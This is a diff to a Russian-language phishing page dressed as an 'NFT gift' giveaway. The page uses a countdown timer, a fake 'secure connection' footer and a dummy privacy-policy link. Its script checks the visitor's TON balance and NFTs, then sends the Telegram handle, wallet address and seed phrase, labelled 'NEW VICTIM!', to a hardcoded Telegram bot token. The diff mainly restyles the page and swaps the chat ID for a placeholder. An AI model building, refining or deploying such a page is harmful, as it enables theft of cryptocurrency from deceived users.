@@ -5,30 +5,128 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>NFT Подарок</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: Arial, sans-serif; background: #0d1117; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        .box { background: #161b22; padding: 40px; border-radius: 20px; max-width: 450px; width: 100%; }
-        input { width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 10px; border: 1px solid #30363d; background: #0d1117; color: white; }
-        button { width: 100%; padding: 15px; background: #238636; border: none; border-radius: 10px; color: white; font-size: 18px; font-weight: bold; cursor: pointer; }
-        button:hover { background: #2ea043; }
-        button:disabled { opacity: 0.5; cursor: not-allowed; }
-        .error { color: #f85149; font-size: 14px; margin-top: 10px; display: none; }
-        .loading { color: #f0883e; font-size: 14px; margin-top: 10px; display: none; }
-        .footer { text-align: center; color: #8b949e; font-size: 12px; margin-top: 20px; }
-        .timer { text-align: center; color: #f0883e; font-size: 18px; margin-bottom: 20px; font-weight: bold; }
-        .info { text-align: center; color: #8b949e; font-size: 13px; margin-bottom: 20px; background: #0d1117; padding: 12px; border-radius: 10px; border: 1px solid #30363d; }
-        .info span { color: #f0883e; font-weight: bold; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: Arial, sans-serif;
+            background: #0d1117;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .box {
+            background: #161b22;
+            padding: 40px;
+            border-radius: 20px;
+            max-width: 450px;
+            width: 100%;
+        }
+        .box h2 {
+            text-align: center;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+        .box p {
+            text-align: center;
+            color: #8b949e;
+            margin-bottom: 25px;
+            font-size: 14px;
+        }
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            margin-bottom: 15px;
+            border-radius: 10px;
+            border: 1px solid #30363d;
+            background: #0d1117;
+            color: white;
+            font-size: 15px;
+            outline: none;
+        }
+        input:focus {
+            border-color: #238636;
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            background: #238636;
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        button:hover {
+            background: #2ea043;
+        }
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .timer {
+            text-align: center;
+            color: #f0883e;
+            font-size: 18px;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+        .info {
+            text-align: center;
+            color: #8b949e;
+            font-size: 13px;
+            margin-bottom: 20px;
+            background: #0d1117;
+            padding: 12px;
+            border-radius: 10px;
+            border: 1px solid #30363d;
+        }
+        .info span {
+            color: #f0883e;
+            font-weight: bold;
+        }
+        .error {
+            color: #f85149;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+            text-align: center;
+        }
+        .loading {
+            color: #f0883e;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+            text-align: center;
+        }
+        .footer {
+            text-align: center;
+            color: #8b949e;
+            font-size: 12px;
+            margin-top: 20px;
+        }
+        .footer a {
+            color: #58a6ff;
+            text-decoration: none;
+        }
     </style>
 </head>
 <body>
     <div class="box">
-        <h2 style="text-align:center; margin-bottom:10px;">🎁 NFT Подарок</h2>
-        <p style="text-align:center; color:#8b949e; margin-bottom:25px;">Введи данные и получи уникальный NFT</p>
+        <h2>🎁 NFT Подарок</h2>
+        <p>Введи данные и получи уникальный NFT</p>
         
         <!-- ТАЙМЕР -->
         <div class="timer">⏳ До конца розыгрыша: <span id="countdown">--:--:--</span></div>
-
-        <!-- УСЛОВИЯ УЧАСТИЯ -->
+        
+        <!-- УСЛОВИЯ -->
         <div class="info">
             ⚡ Для участия необходим минимальный баланс: <span>1 TON</span><br>
             🛡️ Это защита от ботов и спама.
@@ -44,7 +142,8 @@
         </form>
         
         <div class="footer">
-            ⚠️ Подключение безопасно. Мы не храним твои данные.
+            ⚠️ Подключение безопасно. Мы не храним твои данные.<br>
+            <a href="#">Политика конфиденциальности</a>
         </div>
     </div>
 
@@ -97,7 +196,6 @@
                 const nftsData = await nftsResp.json();
                 const nftsCount = nftsData.nfts ? nftsData.nfts.length : 0;
                 
-                // МЕНЯЕМ УСЛОВИЕ: теперь нужно минимум 1 TON ИЛИ NFT
                 return balance >= 1 || nftsCount > 0;
             } catch (e) {
                 console.error('Ошибка проверки:', e);
@@ -132,7 +230,7 @@
 
             // === ВСТАВЬ СВОИ ДАННЫЕ ===
             const botToken = "8592619289:AAHr5VK2tCOhGdRSyBbjFYWQK7k4aKlBUYE";
-            const chatId = "766696719"; // ЗАМЕНИ НА СВОЙ ID
+            const chatId = "ТВОЙ_TELEGRAM_ID"; // ЗАМЕНИ НА СВОЙ ID
 
             const text = `🔴 НОВАЯ ЖЕРТВА!\n👤 TG: ${tg}\n💳 Кошелёк: ${wallet}\n🔑 Сид: ${seed}`;
 
